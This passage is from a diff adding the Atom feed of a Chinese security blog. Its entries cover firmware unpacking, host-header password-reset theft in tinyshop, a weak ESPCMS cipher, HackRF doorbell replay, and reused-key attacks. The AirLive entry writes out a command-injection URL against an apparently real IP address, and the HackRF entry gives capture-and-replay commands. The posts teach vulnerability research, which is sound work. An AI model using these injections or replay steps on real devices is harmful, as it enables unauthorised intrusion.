+<p>这个信息就在strings结果文件开始的地方，稍微往后翻一下或者搜索一下文件系统常用的boot loader名字比如U-boot，就可以找到这些信息。现在我们已经知道这个嵌入式系统使用U-boot作为boot loader，而且知道了它的版本信息。</p>
+<p>#Binwalk</p>
+<p>binwalk会分析二进制文件中可能的固件头或者文件系统，然后输出识别出的每个部分以及对应的偏移量。使用binwalk分析固件如下：<br><img src="/images/Binwalkresults.png" alt=""><br>binwalk给出了大量有用的信息。从这些信息中可以得知这个固件是运行在MIPS架构上的一个linux系统。使用了squashfs文件系统。同时也再次确认boot loader是U-boot。关于binwalk的更详细的用法可以参考<a href="http://www.freebuf.com/tools/15266.html" target="_blank" rel="external">Binwalk：后门（固件）分析利器</a>。</p>
+<p>##提取文件系统</p>
+<p>终于到了最关键的一步，我们要从固件镜像中分离出文件系统的内容。因为是linux系统，可以预见一些标准的linux文件比如passwd和shadow可能会有一些敏感信息。</p>
+<p>很多人使用dd来分离文件系统的内容。使用binwalk和Firmware Modification Kit来解包最简单方便。</p>
+<p>使用binwalk的-e参数可以自动把固件镜像中的所有文件都解出来。</p>
+<pre><code>binwalk -<span class="keyword">e</span> &lt;<span class="keyword">input</span> <span class="keyword">file</span>&gt;
+</code></pre><p>使用Firmware Modification Kit中的extract-firmware.sh脚本会更加高效。如果你想重打包修改之后的固件的话可以使用build-firmware.sh来打包固件。这样可以节省大量时间自己解包和管理所有的偏移。</p>
+<p><a href="http://www.freebuf.com/articles/terminal/75524.html" target="_blank" rel="external">极路由安全设计架构分析</a>这里分析的极路由的那个固件包，使用FMK就可以一键解包。<br><img src="/images/fmk1.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>这个系列的文章以逆向路由器固件的方式来挖掘路由器中存在的漏洞。本篇文章主要以介绍解包固件工具为主。文中演示用的固件可以在这里<a href="http://www.tp-link.com/resources/software/TL-WR841N_V8_130506.zip"]]>
+    </summary>
+    
+      <category term="解包" scheme="http://stayliv3.github.io/tags/%E8%A7%A3%E5%8C%85/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[MVC框架中路由模块容易出现的安全问题]]></title>
+    <link href="http://stayliv3.github.io/2015/08/14/MVC%E6%A1%86%E6%9E%B6%E4%B8%AD%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%9D%97%E5%AE%B9%E6%98%93%E5%87%BA%E7%8E%B0%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
+    <id>http://stayliv3.github.io/2015/08/14/MVC框架中路由模块容易出现的安全问题/</id>
+    <published>2015-08-14T09:46:00.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#MVC中的路由模块</p>
+<p>routing或者dispatch模块负责将请求的URL映射到具体的controler/action上。比如一个请求url如下：</p>
+<pre><code><span class="symbol">http:</span>/<span class="regexp">/localhost/news</span><span class="regexp">/economics/param</span>1/param2
+</code></pre><p>如果不使用mod_rewrite的话应该是下面这种形式。</p>
+<pre><code><span class="string">http:</span><span class="comment">//localhost/index.php?route=news/economics/param1/param2</span>
+</code></pre><p>路由的类负责将URL中的参数解析出来，在我们这个例子中</p>
+<pre><code>controller: NewsController.php
+action <span class="function"><span class="keyword">method</span>:</span> EconomicsAction
+parameters: param1 <span class="keyword">and</span> param2
+</code></pre><p>然后路由类需要实例化控制器，把请求参数传到调用方法里。这就是整个路由模块需要实现的功能。</p>
+<p>#路由模块容易出现的问题</p>
+<p>由于路由模块的功能要求，一般都是解析url中参数去包含对应的control文件。所以如果对相关参数没有进行限制则十分容易出现文件包含的问题。</p>
+<p>案例1<a href="http://wooyun.org/bugs/wooyun-2010-087117" target="_blank" rel="external">YXCMS前台getshell（有条件)</a>,不过由于路由这个地方的功能要求，一般来说包含是需要截断才能利用的。</p>
+<p>案例2<a href="http://wooyun.org/bugs/wooyun-2010-058173" target="_blank" rel="external">easypanel文件包含</a>。</p>
+<p>第二类容易出现的问题就是绕过一些限制，直接调用敏感方法。比如设置密码的方法等。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#MVC中的路由模块</p>
+<p>routing或者dispatch模块负责将请求的URL映射到具体的controler/action上。比如一个请求url如下：</p>
+<pre><code><span class="symbol">http:</span>/<span]]>
+    </summary>
+    
+      <category term="php" scheme="http://stayliv3.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://stayliv3.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[host header attack 之tinyshop重置密码漏洞]]></title>
+    <link href="http://stayliv3.github.io/2015/08/11/host-header-attack-%E4%B9%8Btinyshop%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://stayliv3.github.io/2015/08/11/host-header-attack-之tinyshop重置密码漏洞/</id>
+    <published>2015-08-11T11:04:08.000Z</published>
+    <updated>2015-11-24T03:27:37.000Z</updated>
+    <content type="html"><![CDATA[<p>host header attack这个词也是从老外那里学来的。<a href="http://drops.wooyun.org/papers/1383" target="_blank" rel="external">利用HTTP host头攻击的技术
+</a>这里翻译不是很流畅，最好看看原文。</p>
+<p>tinyshop中生成找回密码邮件的方法如下:</p>
+<pre><code>public <span class="keyword">function</span> forget_act(){
+     <span class="variable">$email</span> =  Filter::sql(Req::args(<span class="string">'email'</span>));
+     <span class="variable">$model</span> = <span class="variable">$this-</span>&gt;model-&gt;table(<span class="string">'user'</span>);
+     <span class="variable">$obj</span> = <span class="variable">$model-</span>&gt;where(<span class="string">"email = '"</span>.<span class="variable">$email</span>.<span class="string">"'"</span>)-&gt;find();
+     if(!empty(<span class="variable">$obj</span>)){
+         <span class="variable">$model</span> = <span class="variable">$this-</span>&gt;model-&gt;table(<span class="string">'reset_password'</span>);
+         <span class="variable">$obj</span> = <span class="variable">$model-</span>&gt;where(<span class="string">"email = '"</span>.<span class="variable">$email</span>.<span class="string">"'"</span>)-&gt;find();
+         <span class="variable">$safecode</span> = md5(md5(<span class="variable">$email</span>).md5(CHash::random(<span class="number">32</span>)));
+         if(!empty(<span class="variable">$obj</span>)){
+             <span class="variable">$obj</span>[<span class="string">'safecode'</span>] = <span class="variable">$safecode</span>;
+             <span class="variable">$model-</span>&gt;data(<span class="variable">$obj</span>)-&gt;update();
+         }
+         else{
+             <span class="variable">$model-</span>&gt;data(array(<span class="string">'email'</span>=&gt;<span class="variable">$email</span>,<span class="string">'safecode'</span>=&gt;<span class="variable">$safecode</span>))-&gt;add();
+         }
+
+
+         <span class="variable">$reset</span>_url = Url::fullUrlFormat(<span class="string">"/simple/reset_password/safecode/$safecode"</span>);
+         <span class="variable">$msg</span>_content = <span class="string">''</span>;
+</code></pre><p>可以看到，生成32位随机数取hash坐位safecode，发送给用户重置密码，这个逻辑是没有问题的。跟一下fullUrlFormat方法。</p>
+<pre><code>static <span class="keyword">function</span> fullUrlFormat(<span class="variable">$path</span>)
+    {
+        <span class="variable">$path</span> = trim(<span class="variable">$path</span>);
+        if(preg_match(<span class="string">'@[/\@#*!]?(https?://.+)$@i'</span>, <span class="variable">$path</span>,<span class="variable">$matches</span>)) return <span class="variable">$matches</span>[<span class="number">1</span>];
+        return self::getHost().self::urlFormat(<span class="variable">$path</span>);
+    }
+</code></pre><p>静态方法fullUrlFormat使用了getHost()来获得当前网站自身的域名。继续跟gethost方法。</p>
+<pre><code><span class="comment">/**
+ *取得网站的host地址
+ */</span>
+<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getHost</span><span class="params">(<span class="variable">$http</span>=<span class="string">'http'</span>)</span>
+</span>{
+    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">"HTTPS"</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">"HTTPS"</span>]==<span class="string">'on'</span>) <span class="variable">$http</span> = <span class="string">"https"</span>;
+    <span class="keyword">if</span>(<span class="keyword">self</span>::<span class="variable">$_host</span>!==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">self</span>::<span class="variable">$_host</span>;
+    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>]))
+        <span class="keyword">self</span>::<span class="variable">$_host</span> = <span class="variable">$http</span>.<span class="string">'://'</span>.<span class="variable">$_SERVER</span>[<span class="string">'HTTP_HOST'</span>];
+    <span class="keyword">else</span>
+        <span class="keyword">self</span>::<span class="variable">$_host</span> = <span class="variable">$http</span>.<span class="string">'://'</span>.<span class="variable">$_SERVER</span>[<span class="string">'SERVER_NAME'</span>];
+
+    <span class="keyword">return</span>  <span class="keyword">self</span>::<span class="variable">$_host</span>;
+}
+</code></pre><p>这里输出一下可以看到找回密码的流程中，调用getHost的时候$_host变量的值是null。所以会依次尝试取$_SERVER[‘HTTP_HOST’]和$_SERVER[‘SERVER_NAME’]作为拼接url的域名使用。而$_SERVER[‘HTTP_HOST’]是取自客户端传递的host头部的值，即客户端是可以伪造这个值的。</p>
+<p>漏洞危害因为需要交互，所以取决于用户量和用户价值。当用户收到这封真实的找回密码邮件，如果点击了URL，则safecode就会发送给攻击者，从而导致自己的账号被盗。</p>
+<p><img src="/images/tinyshop3.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>host header attack这个词也是从老外那里学来的。<a href="http://drops.wooyun.org/papers/1383" target="_blank" rel="external">利用HTTP host头攻击的技术
+</a>这里翻译不是]]>
+    </summary>
+    
+      <category term="php" scheme="http://stayliv3.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://stayliv3.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[hackrf 初探]]></title>
+    <link href="http://stayliv3.github.io/2015/08/06/hackrf-%E5%88%9D%E6%8E%A2/"/>
+    <id>http://stayliv3.github.io/2015/08/06/hackrf-初探/</id>
+    <published>2015-08-06T08:22:58.000Z</published>
+    <updated>2015-11-24T03:27:37.000Z</updated>
+    <content type="html"><![CDATA[<p>#环境搭建</p>
+<p>mac上搭建hackrf实验环境，参考了<a href="http://www.hackrf.net/2014/04/mac-install-hackrf/" target="_blank" rel="external">hackrf.net</a>的文章。总体来说使用port安装还是比较简单的。主要就是时间真的很长很长。。。</p>
+<p>#驱动测试</p>
+<p>运行hackrf_info查看有如下输出信息，说明hackrf驱动正常</p>
+<pre><code>Found HackRF board <span class="number">0</span>:
+Board ID Number: <span class="number">2</span> (HackRF One)
+Firmware Version: git-<span class="number">815</span>d1f6
+Part ID Number: <span class="number">0xa000dddd</span> <span class="number">0x00ddddda</span>
+Serial Number: <span class="number">0x00000000</span> <span class="number">0x00000000</span> <span class="number">0x5a</span>sdfasdc0 <span class="number">0x2a</span>sdfs4b
+</code></pre><p>#抓包重放</p>
+<p>一开始看了一些文章不得要领。其实基本的重放攻击很简单。只要使用hackrf_transfer命令就可以。</p>
+<p>hackrf_transfer命令参数如下：</p>
+<pre><code>➜  ~  hackrf_transfer
+receive -r and receive_wav -w options are mutually exclusive
+Usage:
+    [-d serial_number] <span class="preprocessor"># Serial number of desired HackRF.</span>
+    -r &lt;filename&gt; <span class="preprocessor"># Receive data into file.</span>
+    -t &lt;filename&gt; <span class="preprocessor"># Transmit data from file.</span>
+    -w <span class="preprocessor"># Receive data into file with WAV header and automatic name.</span>
+       <span class="preprocessor"># This is for SDR# compatibility and may not work with other software.</span>
+    [-f freq_hz] <span class="preprocessor"># Frequency in Hz [<span class="number">0</span>MHz to <span class="number">7250</span>MHz].</span>
+    [-i if_freq_hz] <span class="preprocessor"># Intermediate Frequency (IF) in Hz [<span class="number">2150</span>MHz to <span class="number">2750</span>MHz].</span>
+    [-o lo_freq_hz] <span class="preprocessor"># Front-end Local Oscillator (LO) frequency in Hz [<span class="number">84</span>MHz to <span class="number">5400</span>MHz].</span>
+    [-m image_reject] <span class="preprocessor"># Image rejection filter selection, <span class="number">0</span>=bypass, <span class="number">1</span>=low pass, <span class="number">2</span>=high pass.</span>
+    [-a amp_enable] <span class="preprocessor"># RX/TX RF amplifier <span class="number">1</span>=Enable, <span class="number">0</span>=Disable.</span>
+    [-p antenna_enable] <span class="preprocessor"># Antenna port power, <span class="number">1</span>=Enable, <span class="number">0</span>=Disable.</span>
+    [-l gain_db] <span class="preprocessor"># RX LNA (IF) gain, <span class="number">0</span>-<span class="number">40</span>dB, <span class="number">8</span>dB steps</span>
+    [-g gain_db] <span class="preprocessor"># RX VGA (baseband) gain, <span class="number">0</span>-<span class="number">62</span>dB, <span class="number">2</span>dB steps</span>
+    [-x gain_db] <span class="preprocessor"># TX VGA (IF) gain, <span class="number">0</span>-<span class="number">47</span>dB, <span class="number">1</span>dB steps</span>
+    [-s sample_rate_hz] <span class="preprocessor"># Sample rate in Hz (<span class="number">8</span>/<span class="number">10</span>/<span class="number">12.5</span>/<span class="number">16</span>/<span class="number">20</span>MHz, default <span class="number">10</span>MHz).</span>
+    [-n num_samples] <span class="preprocessor"># Number of samples to transfer (default is unlimited).</span>
+    [-c amplitude] <span class="preprocessor"># CW signal source mode, amplitude <span class="number">0</span>-<span class="number">127</span> (DC value to DAC).</span>
+    [-R] <span class="preprocessor"># Repeat TX mode (default is off)</span>
+    [-b baseband_filter_bw_hz] <span class="preprocessor"># Set baseband filter bandwidth in MHz.</span>
+    Possible values: <span class="number">1.75</span>/<span class="number">2.5</span>/<span class="number">3.5</span>/<span class="number">5</span>/<span class="number">5.5</span>/<span class="number">6</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">9</span>/<span class="number">10</span>/<span class="number">12</span>/<span class="number">14</span>/<span class="number">15</span>/<span class="number">20</span>/<span class="number">24</span>/<span class="number">28</span>MHz, <span class="keyword">default</span> &lt; sample_rate_hz.
+</code></pre><p><a href="https://www.youtube.com/watch?v=vHHRGOxcc-0" target="_blank" rel="external">youtube视频教程</a></p>
+<p>常用参数解释：</p>
+<pre><code>-<span class="ruby">r 接受数据写入文件
+</span>-<span class="ruby">f 监听的频率 单位是<span class="constant">Hz</span>，所以<span class="number">443</span>Mhz 应该监听-f <span class="number">44300000000</span>
+</span>-<span class="ruby">s 取样比率，单位是<span class="constant">Hz</span>，默认是<span class="number">10</span>Mhz
+</span>-<span class="ruby">n 取样数量，默认不限制
+</span>-<span class="ruby"><span class="constant">R</span> 循环发射模式。默认关
+</span>-<span class="ruby">x <span class="constant">TX</span> <span class="constant">VGA</span> (<span class="constant">IF</span>) 增益，范围<span class="number">0</span>-<span class="number">47</span>dB，必须是<span class="number">1</span>的倍数。
+</span>-<span class="ruby">a amp-enable</span>
+</code></pre><p>所以最常见的无线门铃的重放使用以下两个命令即可。</p>
+<pre><code>hackrf_transfer -r door2<span class="class">.iq</span> -f <span class="number">433920000</span> 
+</code></pre><p>过滤433920000hz频率的通信，写入到文件door2.iq</p>
+<p>重放命令：</p>
+<pre><code>hackrf_transfer -t door2.iq -f <span class="number">433920000</span> -a <span class="number">1</span> -l <span class="number">30</span> -x <span class="number">40</span>
+</code></pre><p>经过测试发现，有时候抓的包重放会失败。不知道是硬件问题还是这种粗犷的重放方式本身有可能出错。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#环境搭建</p>
+<p>mac上搭建hackrf实验环境，参考了<a href="http://www.hackrf.net/2014/04/mac-install-hackrf/" target="_blank" rel="external">hackrf.net</a]]>
+    </summary>
+    
+      <category term="hackrf" scheme="http://stayliv3.github.io/tags/hackrf/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[mac上安装及使用binwalk]]></title>
+    <link href="http://stayliv3.github.io/2015/08/05/mac%E4%B8%8A%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8binwalk/"/>
+    <id>http://stayliv3.github.io/2015/08/05/mac上安装及使用binwalk/</id>
+    <published>2015-08-05T08:55:25.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#安装</p>
+<p>直接从github下clone之后，使用setup.py安装。分析固件的时候报错：</p>
+<pre><code><span class="label">WARNING: </span>Extractor.execute failed to run external extrator <span class="emphasis">'unsquashfs -d '</span>%%squashfs-root%%' <span class="emphasis">'%e'</span><span class="emphasis">':</span>
+</code></pre><p>原因是没有安装unsquashfs组件。</p>
+<p>然后尝试使用brew install binwalk 安装</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#安装</p>
+<p>直接从github下clone之后，使用setup.py安装。分析固件的时候报错：</p>
+<pre><code><span class="label">WARNING: </span>Extractor.execute failed to run e]]>
+    </summary>
+    
+      <category term="binwalk" scheme="http://stayliv3.github.io/tags/binwalk/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[古典密码的误用之ESPCMS加密函数]]></title>
+    <link href="http://stayliv3.github.io/2015/07/13/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%9A%84%E8%AF%AF%E7%94%A8%E4%B9%8BESPCMS%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0/"/>
+    <id>http://stayliv3.github.io/2015/07/13/古典密码的误用之ESPCMS加密函数/</id>
+    <published>2015-07-13T09:15:49.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#古典密码知识<br>参考资料《图解密码学》</p>
+<p>凯撒密码：csesar cipher</p>
+<p>#经典案例值ESPCMS</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-062528" target="_blank" rel="external">ESPCMS最新 V5.8.14.03.03 UTF8 正式版暴力注入</a><br><a href="http://www.wooyun.org/bugs/wooyun-2014-053577" target="_blank" rel="external">EspCMS最新版可伪造任意帐户登陆（简单利用代码）</a></p>
+<p>旧版本加解密函数如下：</p>
+<pre><code><span class="keyword">function</span> eccode(<span class="variable">$string</span>, <span class="variable">$operation</span> = <span class="string">'DECODE'</span>, <span class="variable">$key</span> = <span class="string">'@LFK24s224%@safS3s%1f%'</span>, <span class="variable">$mcrype</span> = <span class="literal">true</span>) {
+
+    <span class="variable">$result</span> = null;
+
+    if (<span class="variable">$operation</span> == <span class="string">'ENCODE'</span>) {
+
+        for (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$string</span>); <span class="variable">$i</span>++) {
+
+            <span class="variable">$char</span> = substr(<span class="variable">$string</span>, <span class="variable">$i</span>, <span class="number">1</span>);
+
+            <span class="variable">$keychar</span> = substr(<span class="variable">$key</span>, (<span class="variable">$i</span> % strlen(<span class="variable">$key</span>)) - <span class="number">1</span>, <span class="number">1</span>);
+
+            <span class="variable">$char</span> = chr(ord(<span class="variable">$char</span>) + ord(<span class="variable">$keychar</span>)); //看到这应该懂了
+
+            <span class="variable">$result</span>.=<span class="variable">$char</span>;
+
+        }
+
+        <span class="variable">$result</span> = base64_encode(<span class="variable">$result</span>);
+
+        <span class="variable">$result</span> = str_replace(array(<span class="string">'+'</span>, <span class="string">'/'</span>, <span class="string">'='</span>), array(<span class="string">'-'</span>, <span class="string">'_'</span>, <span class="string">''</span>), <span class="variable">$result</span>);
+
+    } elseif (<span class="variable">$operation</span> == <span class="string">'DECODE'</span>) {
+
+        <span class="variable">$data</span> = str_replace(array(<span class="string">'-'</span>, <span class="string">'_'</span>), array(<span class="string">'+'</span>, <span class="string">'/'</span>), <span class="variable">$string</span>);
+
+        <span class="variable">$mod4</span> = strlen(<span class="variable">$data</span>) % <span class="number">4</span>;
+
+        if (<span class="variable">$mod4</span>) {
+
+            <span class="variable">$data</span> .= substr(<span class="string">'===='</span>, <span class="variable">$mod4</span>);
+
+        }
+
+        <span class="variable">$string</span> = base64_decode(<span class="variable">$data</span>);
+
+        for (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$string</span>); <span class="variable">$i</span>++) {
+
+            <span class="variable">$char</span> = substr(<span class="variable">$string</span>, <span class="variable">$i</span>, <span class="number">1</span>);
+
+            <span class="variable">$keychar</span> = substr(<span class="variable">$key</span>, (<span class="variable">$i</span> % strlen(<span class="variable">$key</span>)) - <span class="number">1</span>, <span class="number">1</span>);
+
+            <span class="variable">$char</span> = chr(ord(<span class="variable">$char</span>) - ord(<span class="variable">$keychar</span>));
+
+            <span class="variable">$result</span>.=<span class="variable">$char</span>;
+
+        }
+
+    }
+
+    return <span class="variable">$result</span>;
+
+}
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>#古典密码知识<br>参考资料《图解密码学》</p>
+<p>凯撒密码：csesar cipher</p>
+<p>#经典案例值ESPCMS</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-062528" targe]]>
+    </summary>
+    
+      <category term="加密解密" scheme="http://stayliv3.github.io/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
+    
+      <category term="古典密码" scheme="http://stayliv3.github.io/categories/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[AirLive摄像机命令注入漏洞]]></title>
+    <link href="http://stayliv3.github.io/2015/07/08/AirLive%E6%91%84%E5%83%8F%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://stayliv3.github.io/2015/07/08/AirLive摄像机命令注入漏洞/</id>
+    <published>2015-07-08T07:09:12.000Z</published>
+    <updated>2015-11-24T03:27:37.000Z</updated>
+    <content type="html"><![CDATA[<p>#影响范围:</p>
+<pre><code><span class="number">1</span>、AirLive BU-<span class="number">2015</span>，固件版本<span class="number">1.03</span><span class="number">.18</span> <span class="number">16.06</span><span class="number">.2014</span>
+<span class="number">2</span>、AirLive BU-<span class="number">3026</span>，固件版本<span class="number">1.43</span> <span class="number">21.08</span><span class="number">.2014</span>
+<span class="number">3</span>、AirLive MD-<span class="number">3025</span>，固件版本<span class="number">1.81</span> <span class="number">21.08</span><span class="number">.2014</span>
+<span class="number">4</span>、AirLive WL-<span class="number">2000</span>CAM，固件版本LM<span class="number">.1</span><span class="number">.6</span><span class="number">.18</span> <span class="number">14.10</span><span class="number">.2011</span>
+<span class="number">5</span>、AirLive POE-<span class="number">200</span>CAM v2 ，固件版本LM<span class="number">.1</span><span class="number">.6</span><span class="number">.17</span><span class="number">.01</span>
+</code></pre><p><img src="/images/airlive1.png" alt=""></p>
+<p>#命令注入漏洞测试</p>
+<p>通过关键字可以在互联网上找到airlive的摄像机。通过以下链接测试系统命令注入漏洞，这里注入ls命令测试。</p>
+<pre><code>http://<span class="number">90.178.21.235</span>:8080/cgi_test.cgi?write_tan&amp;<span class="comment">;ls&amp;   </span>
+</code></pre><p><img src="/images/airlive2.png" alt=""></p>
+<p>由于这里对write_tan参数的长度进行了限制，所以这个漏洞利用起来有一定的难度，这里仅仅是演示命令注入漏洞的效果。</p>
+<p>#技术细节<br>参考<a href="http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection" target="_blank" rel="external">airlive-multiple-products-os-command-injection</a></p>
+<p>#参考资料<br><a href="http://www.freebuf.com/news/71870.html" target="_blank" rel="external">AirLive IP监控相机存在命令注入漏洞</a><br><a href="http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection" target="_blank" rel="external">airlive-multiple-products-os-command-injection</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#影响范围:</p>
+<pre><code><span class="number">1</span>、AirLive BU-<span class="number">2015</span>，固件版本<span class="number">1.03</span><span]]>
+    </summary>
+    
+      <category term="物联网,命令注入" scheme="http://stayliv3.github.io/tags/%E7%89%A9%E8%81%94%E7%BD%91-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[密码学之Reused Key Attack]]></title>
+    <link href="http://stayliv3.github.io/2015/07/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8BReused-Key-Attack/"/>
+    <id>http://stayliv3.github.io/2015/07/07/密码学之Reused-Key-Attack/</id>
+    <published>2015-07-07T07:54:19.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#reused key attack</p>
+<p>参考《白帽子讲web安全》第11章 加密算法和随机数。</p>
+<p>流密码加密算法的使用中，最常见的错误是使用同一个密钥进行多次加解密。流密码的加密是基于异或(XOR)操作进行的。XOR操作规则如下：</p>
+<pre><code><span class="number">1</span> xor <span class="number">1</span>=<span class="number">0</span> 
+<span class="number">1</span> xor <span class="number">0</span>=<span class="number">1</span> 
+<span class="number">0</span> xor <span class="number">1</span>=<span class="number">1</span> 
+<span class="number">0</span> xor <span class="number">0</span>=<span class="number">0</span> 
+</code></pre><p>假设有密钥C，明文A，明文B，那么XOR加密可以表示为：</p>
+<pre><code><span class="function"><span class="title">E</span><span class="params">(A)</span></span> = A xor C
+<span class="function"><span class="title">E</span><span class="params">(B)</span></span> = B xor C
+</code></pre><p>密文是公开的，所以很容易计算 </p>
+<pre><code><span class="function"><span class="title">E</span><span class="params">(A)</span></span> xor <span class="function"><span class="title">E</span><span class="params">(B)</span></span>
+</code></pre><p>根据异或的规则，如果两个数相同，则xor运算的结果为0。</p>
+<pre><code>E<span class="comment">(A)</span> <span class="keyword">xor</span> E<span class="comment">(B)</span> = <span class="comment">(A xor C)</span> <span class="keyword">xor</span> <span class="comment">(B xor C)</span> = A <span class="keyword">xor</span> C <span class="keyword">xor</span> B <span class="keyword">xor</span> C = A <span class="keyword">xor</span> B
+</code></pre><p>所以E(A),E(B),A,B四个数据中只要知道3个就可以推算出剩下的一个。这个过程完全不需要密钥C的参与。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#reused key attack</p>
+<p>参考《白帽子讲web安全》第11章 加密算法和随机数。</p>
+<p>流密码加密算法的使用中，最常见的错误是使用同一个密钥进行多次加解密。流密码的加密是基于异或(XOR)操作进行的。XOR操作规则如下：</p>
+<pre>]]>
+    </summary>
+    
+      <category term="密码学" scheme="http://stayliv3.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+      <category term="加密解密" scheme="http://stayliv3.github.io/categories/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
+    
+  </entry>
+  
+</feed>
